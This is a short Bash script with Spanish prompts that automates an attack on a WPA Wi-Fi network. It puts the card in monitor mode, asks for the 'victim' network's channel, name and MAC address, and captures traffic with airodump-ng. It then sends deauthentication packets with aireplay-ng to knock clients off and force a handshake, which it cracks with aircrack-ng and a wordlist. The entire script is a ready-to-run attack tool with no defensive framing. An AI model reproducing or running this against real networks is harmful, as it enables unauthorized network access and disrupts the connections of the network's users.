#!/bin/bash
clear

read -p "Hola $USER, ¿Quieres comenzar? (si / no): " firstDecision

firstTerminal(){
  xterm -hold -e sudo airodump-ng -c $canal --bssid $mac --write $name wlan0mon &
}

dictionariOrSave(){
  read -p "¿Quieres intentar decifrar con un diccionario o guardar el handshake? [ D(diccionario) / G(guardar) ] " doc
  case $doc in
    D)
      read -p "Escribe la ruta del diccionario: " diccionario
      sudo aircrack-ng "$name"'-01.cap' -w "$diccionario"
      sudo NetworkManager start
      sudo airmon-ng stop wlan0mon
     ;;
    G)
      echo "Saliendo..."
      sleep 2s
      sudo NetworkManager start
      sudo airmon-ng stop wlan0mon
      exit
  esac
}

case $firstDecision in
  si)
    echo "Comenzando..."
    echo "Matando procesos que pueden interferir..."
    sudo airmon-ng check kill
    echo "Poniendo interfaz en modo monitor..."
    sudo airmon-ng start wlan0
    echo "Escaneando redes..."
    echo "Puedes detener el escaneo cuando quieras con ctrl +c"
    sleep 5s
    sudo airodump-ng wlan0mon 
    read -p "Canal de la victima: " canal
    read -p "Nombre de la red: " red
    read -p "Direccion MAC: " mac 
    read -p "Nombre del archivo resultante: " name
    firstTerminal 
    sleep 5s 
    sudo aireplay-ng -0 10 -a $mac  -e $red wlan0mon
    dictionariOrSave
    ;;
  no)
    echo "Saliendo del script."
    exit
esac
